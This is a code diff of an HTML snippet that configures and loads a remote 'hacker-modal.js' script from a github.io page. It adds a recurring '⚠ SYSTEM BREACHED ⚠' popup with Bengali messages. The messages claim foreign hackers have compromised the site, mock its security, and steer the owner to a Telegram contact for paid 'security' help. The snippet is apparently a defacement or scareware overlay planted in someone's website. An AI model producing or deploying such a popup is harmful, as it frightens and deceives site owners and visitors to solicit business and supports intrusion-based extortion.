@@ -1,12 +1,35 @@
 <script>
   window.HackerModalSettings = {
     telegram: "@dev_script_writer",
+
+    title: "⚠ SYSTEM BREACHED ⚠",
+
+    messages: [
+      "তোমার এই সাইটটি বিদেশি হ্যাকাররা হ্যাক করেছে।",
+      "স্ক্রিনশটে তাদের হ্যাঁস করা কোড দেয়া।",
+      "তোমার সাইটের সিকিউরিটি খুবই বাজে। একজন বুদ্ধিমান বাচ্চাও এটি হ্যাক করতে পারবে। যেমন আমি করেছি।",
+      "তুমি যদি কোনো ভালো ডেভেলপার দিয়ে নিজের সাইটের সিকিউরিটি বাড়াতে চাও, আমি একজনকে রেফার করতে পারি।",
+      "তাকে এই টেলিগ্রামে নক করতে পারো:"
+    ],
+
+    buttonText: "আমি বুঝেছি",
+
+    // ছবি দিতে চাইলে দাও
     images: [
       "https://yourdomain.com/image1.jpg",
       "https://yourdomain.com/image2.jpg",
       "https://yourdomain.com/image3.jpg"
-    ]
+    ],
+
+    // ব্যাকগ্রাউন্ড ইমেজ দিতে চাইলে দাও
+    backgroundImage: "https://yourdomain.com/background.jpg",
+
+    // ১০ মিনিট পর পর আবার দেখাবে
+    intervalMs: 600000,
+
+    // ৫ সেকেন্ড পর অটো ক্লোজ হবে
+    autoCloseMs: 5000
   };
 </script>
 
-<script src="https://web-developer-007.github.io/hacked-responsive-modal/hacker-modal.js" defer></script>
+<script src="https://web-developer-007.github.io/hacked-modal/hacker-modal.js" defer></script>
